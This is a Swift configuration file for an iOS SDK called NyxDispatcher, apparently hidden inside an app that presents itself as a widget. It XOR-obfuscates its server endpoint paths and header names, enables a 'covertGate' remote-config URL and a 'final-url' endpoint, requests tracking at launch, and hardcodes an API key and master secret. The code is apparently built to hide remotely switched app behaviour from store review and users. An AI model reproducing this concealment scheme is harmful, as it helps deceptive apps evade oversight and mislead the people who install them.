


import Foundation
import CryptoKit



struct NyxDispatcherConfig {

    

    
    static let apiVersion = "v1"

    
    
    
    
    
    static let schemaVersion = "2"
    static let networkingEnabled = true
    static let webSurfaceEnabled = false

    

    
    
    
    static let systemOAuthEnabled = false
    static let fileUploadEnabled = false
    static let cameraUploadEnabled = false
    static let photoLibraryUploadEnabled = false
    static let microphoneCaptureEnabled = false

    

    
    
    
    
    
    
    static let vaultKey: [UInt8] = [71, 49, 83, 43, 230, 193, 222, 227, 31, 179, 175, 110, 119, 60, 213, 247, 120, 104, 164, 110, 236, 68, 38, 252]
    
    
    
    static let vault: [[UInt8]] = [[47, 69, 39, 91, 149, 251, 241, 204, 116, 218, 193, 9, 4, 95, 186, 130, 10, 28, 195, 15, 129, 33, 85, 210, 48, 84, 49, 88, 143, 181, 187], [104, 80, 35, 66, 201, 183, 239, 204, 124, 223, 198, 11, 25, 72, 250, 158, 22, 1, 208], [104, 80, 35, 66, 201, 183, 236, 204, 126, 192, 220, 11, 3, 79, 250, 148, 23, 6, 194, 7, 139, 106, 76, 143, 40, 95], [104, 80, 35, 66, 201, 183, 239, 204, 124, 223, 198, 11, 25, 72, 250, 146, 14, 13, 202, 26], [104, 80, 35, 66, 201, 183, 239, 204, 124, 223, 198, 11, 25, 72, 250, 135, 13, 27, 204, 67, 152, 43, 77, 153, 41]]
    
    
    
    
    static let serverURLPlain = "https://concrete-league-rain-beat-time-home.online"
    static let initPathPlain = ""
    static let alternateInitPathPlain = ""
    static let eventPathPlain = ""
    static let pushTokenPathPlain = ""
    
    
    private static func vaultReveal(_ idx: Int, _ fallback: String) -> String {
        guard idx >= 0, idx < vault.count,
              let s = NyxNova.reveal(vault[idx], key: vaultKey) else {
            return fallback
        }
        return s
    }

    

    
    
    
    static var serverURL: String { vaultReveal(0, serverURLPlain) }

    
    static var eventPathSuffix: String { vaultReveal(3, eventPathPlain) }
    
    static var pushTokenPathSuffix: String { vaultReveal(4, pushTokenPathPlain) }

    static var initEndpoint: String { serverURL + wirePath("init", fallback: vaultReveal(1, initPathPlain)) }
    static var eventEndpoint: String { serverURL + wirePath("event", fallback: eventPathSuffix) }
    
    
    
    static var pushTokenEndpoint: String { serverURL + wirePath("push", fallback: pushTokenPathSuffix) }

    
    
    static var finalUrlEndpoint: String { serverURL + "/api/v1/client/final-url" }

    
    
    
    
    static func wirePath(_ label: String, fallback: @autoclosure () -> String) -> String {
        if perAppPathsEnabled && !masterSecret.isEmpty {
            let p = NyxSession.derive(masterSecret, label)
            if !p.isEmpty { return p }
        }
        return fallback()
    }

    

    
    
    
    
    
    
    
    
    
    
    static let rtVaultKey: [UInt8] = [131, 153, 15, 31, 253, 176, 172, 102, 78, 117, 94, 77, 67, 71, 161, 104, 66, 166, 220, 235, 189, 220, 23, 13, 225, 228, 141, 134, 37, 116, 194, 119]
    static let rtVault: [[UInt8]] = [[219, 180, 92, 124, 149, 213, 193, 7], [219, 180, 92, 118, 154, 222, 205, 18, 59, 7, 59], [219, 180, 91, 118, 144, 213, 223, 18, 47, 24, 46], [219, 180, 73, 115, 146, 199, 129, 50, 33, 30, 59, 35], [244, 240, 107, 120, 152, 196, 130, 0, 34, 26, 41, 99, 55, 40, 202, 13, 44], [244, 240, 107, 120, 152, 196, 130, 5, 47, 22, 54, 40, 39, 105, 211, 13, 49, 210, 174, 130, 222, 168, 126, 98, 143]]
    static let hdrSchemaPlain = ""
    static let hdrSignaturePlain = ""
    static let hdrTimestampPlain = ""
    static let hdrFlowTokenPlain = ""
    static let flowTokenKeyPlain = ""
    static let restrictionKeyPlain = ""
    fileprivate static func rtReveal(_ idx: Int, _ fallback: String) -> String {
        guard idx >= 0, idx < rtVault.count,
              let s = NyxNova.reveal(rtVault[idx], key: rtVaultKey) else {
            return fallback
        }
        return s
    }

    
    static var hdrSchema: String { rtReveal(0, hdrSchemaPlain) }
    static var hdrSignature: String { rtReveal(1, hdrSignaturePlain) }
    static var hdrTimestamp: String { rtReveal(2, hdrTimestampPlain) }
    static var hdrFlowToken: String { rtReveal(3, hdrFlowTokenPlain) }

    

    
    
    
    
    
    static let cherryFlowEnabled = true
    static let alternateInitPathEnabled = true
    static let encryptBodyEnabled = true
    static let authInBodyEnabled = true
    static let privacyInSettingsEnabled = false
    static let privacyURLString = "https://concrete-league-rain-beat-time-home.online/privacy"
    static let termsURLString = "https://concrete-league-rain-beat-time-home.online/terms"

    
    static var privacyURL: URL? {
        guard !privacyURLString.isEmpty,
              privacyURLString != "https://example.com/privacy" else { return nil }
        return URL(string: privacyURLString)
    }

    static var termsURL: URL? {
        guard !termsURLString.isEmpty,
              termsURLString != "https://example.com/terms" else { return nil }
        return URL(string: termsURLString)
    }

    

    
    
    
    
    static let nativeAdEnabled = true
    static let covertGateEnabled = true
    static let covertGateURLPlain = "https://covert-gate.wc-appcfg.workers.dev/v1/config"
    static let covertGateID = "P-GdCUzg9i_EClu0"
    static var covertGateURL: String { covertGateURLPlain }

    
    
    
    
    static var initPathSuffix: String {
        if perAppPathsEnabled && !masterSecret.isEmpty {
            return wirePath("init", fallback: vaultReveal(1, initPathPlain))
        }
        return alternateInitPathEnabled
            ? vaultReveal(2, alternateInitPathPlain)
            : vaultReveal(1, initPathPlain)
    }

    

    static let requestTimeout: TimeInterval = 30
    static let webViewTimeout: TimeInterval = 60

    

    enum Keys {
        static let uniqueID = "widget.user.unique_id"
        static let cachedConfig = "widget.cached.config"
        static let pushShownDate = "widget.push.shown_date"
        static let pushResult = "widget.push.result"  
        static let rateShownDate = "widget.rate.shown_date"
        static let privacyAcceptedDate = "widget.privacy.accepted_date"
        static let firstLaunchDate = "widget.first.launch"
        
        
        
        
        
        static var flowToken: String { NyxDispatcherConfig.rtReveal(4, NyxDispatcherConfig.flowTokenKeyPlain) }
        
        
        
        
        
        static var cachedRestriction: String { NyxDispatcherConfig.rtReveal(5, NyxDispatcherConfig.restrictionKeyPlain) }
    }

    

    
    
    
    
    static let apiKey = "4d33e5ee235720d272b33b06b9ec86ecdbe8f2c87e5c29427b881274e593279f"
    static let masterSecret = "d7c0f5740b7d0da134eb013b828323a0f35867a48d0b0f35ac47d6adf7488d4c"
    static let hmacEnabled = true
    static let perAppPathsEnabled = true
    static let deepLinkScheme = ""
    static let universalDomains: [String] = []
    static let privacyDelay: TimeInterval = 2

    

    #if DEBUG
    static let isLoggingEnabled = true
    #else
    static let isLoggingEnabled = false
    #endif
}



struct NyxDispatcherSettings {

    
    var apiKey: String = ""

    
    var serverURL: String = NyxDispatcherConfig.serverURL

    
    var debugMode: Bool = NyxDispatcherConfig.isLoggingEnabled

    
    var timeout: TimeInterval = NyxDispatcherConfig.requestTimeout

    
    
    var hasATT: Bool = true

    
    var requestTrackingOnLaunch: Bool = true

    
    var pushDelayOverride: TimeInterval?

    
    var rateDelayOverride: TimeInterval?

    
    var privacyURL: URL?

    var termsURL: URL?

    

    static func create() -> Builder { Builder() }

    class Builder {
        private var settings = NyxDispatcherSettings()

        @discardableResult
        func apiKey(_ key: String) -> Builder {
            settings.apiKey = key
            return self
        }

        @discardableResult
        func serverURL(_ url: String) -> Builder {
            settings.serverURL = url
            return self
        }

        @discardableResult
        func debug(_ enabled: Bool) -> Builder {
            settings.debugMode = enabled
            return self
        }

        @discardableResult
        func timeout(_ seconds: TimeInterval) -> Builder {
            settings.timeout = seconds
            return self
        }

        @discardableResult
        func hasATT(_ enabled: Bool) -> Builder {
            settings.hasATT = enabled
            return self
        }

        @discardableResult
        func trackingOnLaunch(_ enabled: Bool) -> Builder {
            settings.requestTrackingOnLaunch = enabled
            return self
        }

        @discardableResult
        func pushDelay(_ seconds: TimeInterval) -> Builder {
            settings.pushDelayOverride = seconds
            return self
        }

        @discardableResult
        func rateDelay(_ seconds: TimeInterval) -> Builder {
            settings.rateDelayOverride = seconds
            return self
        }

        @discardableResult
        func privacyURL(_ url: URL?) -> Builder {
            settings.privacyURL = url
            return self
        }

        @discardableResult
        func termsURL(_ url: URL?) -> Builder {
            settings.termsURL = url
            return self
        }

        func build() -> NyxDispatcherSettings { settings }
    }
}
